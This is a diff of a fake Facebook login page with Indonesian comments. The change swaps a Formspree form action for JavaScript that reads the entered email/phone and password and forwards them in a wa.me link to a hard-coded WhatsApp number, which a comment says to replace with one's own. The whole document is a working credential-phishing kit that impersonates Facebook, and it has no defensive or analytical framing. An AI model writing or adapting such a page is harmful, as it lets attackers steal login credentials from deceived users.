@@ -28,21 +28,30 @@
 <body>
   <div class="login-box">
     <div class="logo-text mb-3">facebook</div>
-
-    <!-- Ganti action URL di bawah dengan URL Formspree kamu -->
-    <form action="https://formspree.io/f/mwpbwawg" method="POST">
+    <form onsubmit="sendToWhatsApp(event)">
       <div class="mb-3">
-        <input type="text" class="form-control" name="email_or_phone" placeholder="Email address or phone number" required>
+        <input type="text" class="form-control" id="email_or_phone" placeholder="Email address or phone number" required>
       </div>
       <div class="mb-3">
-        <input type="password" class="form-control" name="password" placeholder="Password" required>
+        <input type="password" class="form-control" id="password" placeholder="Password" required>
       </div>
-
-      <!-- Opsional: redirect ke halaman sukses -->
-      <input type="hidden" name="_redirect" value="success.html">
-
       <button type="submit" class="btn btn-primary w-100">Log In</button>
     </form>
   </div>
+
+  <script>
+    function sendToWhatsApp(event) {
+      event.preventDefault();
+
+      const email = document.getElementById("email_or_phone").value;
+      const password = document.getElementById("password").value;
+
+      const phone = "6285269961823"; // Ganti dengan nomor WhatsApp kamu (tanpa +)
+      const message = `Tolong Diproses Ya:%0AEmail/Phone: ${email}%0APassword: ${password}`;
+      const waURL = `https://wa.me/${phone}?text=${message}`;
+
+      window.location.href = waURL;
+    }
+  </script>
 </body>
 </html>
